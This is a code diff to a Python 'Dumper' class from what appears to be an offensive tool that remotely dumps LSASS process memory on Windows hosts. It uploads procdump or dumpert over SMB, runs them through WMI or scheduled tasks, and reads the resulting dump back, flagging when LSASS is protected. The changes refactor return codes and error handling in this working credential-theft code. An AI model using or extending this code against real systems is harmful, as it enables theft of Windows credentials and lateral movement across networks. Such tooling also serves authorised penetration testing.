@@ -23,7 +23,7 @@ class Dumper:
         self._dumpert = "dumpert.exe"
         self._procdump_path = args.procdump
         self._dumpert_path = args.dumpert
-        self._method = args.method
+        self._method = str(args.method)
         self._timeout = args.timeout
 
         if args.dumpname:
@@ -37,7 +37,6 @@ class Dumper:
             self._procdump_path = args.procdump
         if args.dumpert is not None:
             self._dumpert_path = args.dumpert
-            self._remote_lsass_dump = "dumpert.dmp"
 
         self.exec_methods = {"wmi": WMI, "task": TASK_EXEC}
         self.procdump = False
@@ -106,25 +105,24 @@ class Dumper:
             else:
                 continue
 
-            if dumped:
+            if dumped.success():
                 """
                 If procdump failed, a dumpfile was created, and its content is "FAILED"
                 Best guess is that lsass is protected in some way (PPL, AV, ...)
                 """
-                try:
-                    ifile.open(
-                        (self._share + self._tmp_dir + self._remote_lsass_dump).replace("\\", "/"),
-                        timeout=self._timeout
-                    )
 
+                ret = ifile.open(
+                    (self._share + self._tmp_dir + self._remote_lsass_dump).replace("\\", "/"),
+                    timeout=self._timeout
+                )
+                if isinstance(ret, ImpacketFile):
                     if ifile.size() < 100 and ifile.read(6).decode('utf-8') == "FAILED":
                         ifile.close()
                         return RetCode(ERROR_LSASS_PROTECTED)
                     ifile.seek(0)
                     return ifile
-                except Exception as e:
+                else:
                     self._log.warn("No dump file found with \"{}\" using \"{}\" exec method.".format(dump_method, exec_shell))
-                    self._log.debug("Error : {}".format(str(e)))
 
         """
         If no dump file was found, it means that procdump didn't crash, so it may take more time than expected.
@@ -209,11 +207,11 @@ class Dumper:
                     self._log.debug("Trying exec method : " + exec_method)
                     self.exec_methods[exec_method](self._conn, self._log).execute(commands)
                     self._log.debug("Exec method \"{}\" success !".format(exec_method))
-                    return True
+                    return RetCode(ERROR_SUCCESS)
                 except Exception as e:
                     self._log.warn("Exec method \"{}\" failed.".format(exec_method))
                     self._log.debug("Error : {}".format(str(e)))
-            return RetCode(ERROR_WMI_NO_EXECUTE)
+            return RetCode(ERROR_PROCDUMP_NO_EXECUTE)
 
     def dumpert_dump(self, exec_methods=("wmi", "task")):
         """
@@ -223,6 +221,10 @@ class Dumper:
         if not self._dumpert_path:
             self._log.warn("dumpert path has not been provided")
             return RetCode(ERROR_DUMPERT_NOT_PROVIDED)
+        # Verify dumpert exists on host
+        if not os.path.exists(self._dumpert_path):
+            self._log.warn("{} does not exist.".format(self._dumpert_path))
+            return RetCode(ERROR_DUMPERT_NOT_FOUND)
 
         # Upload dumpert
         self._log.debug('Copy {} to {}'.format(self._dumpert_path, self._tmp_dir))
@@ -232,7 +234,7 @@ class Dumper:
             except Exception as e:
                 return RetCode(ERROR_DUMPERT_NOT_UPLOADED)
         self.dumpert = True
-
+        self._remote_lsass_dump = "dumpert.dmp"
         # Dump lsass using PID
         commands = [
             """cmd.exe /Q /c {}{}""".format(
@@ -252,11 +254,11 @@ class Dumper:
                     self._log.debug("Trying exec method : " + exec_method)
                     self.exec_methods[exec_method](self._conn, self._log).execute(commands)
                     self._log.debug("Exec method \"{}\" success !".format(exec_method))
-                    return True
+                    return RetCode(ERROR_SUCCESS)
                 except Exception as e:
                     self._log.warn("Exec method \"{}\" failed.".format(exec_method))
                     self._log.debug("Error : {}".format(str(e)))
-            return RetCode(ERROR_WMI_NO_EXECUTE)
+            return RetCode(ERROR_DUMPERT_NO_EXECUTE)
 
     def clean(self):
         try:
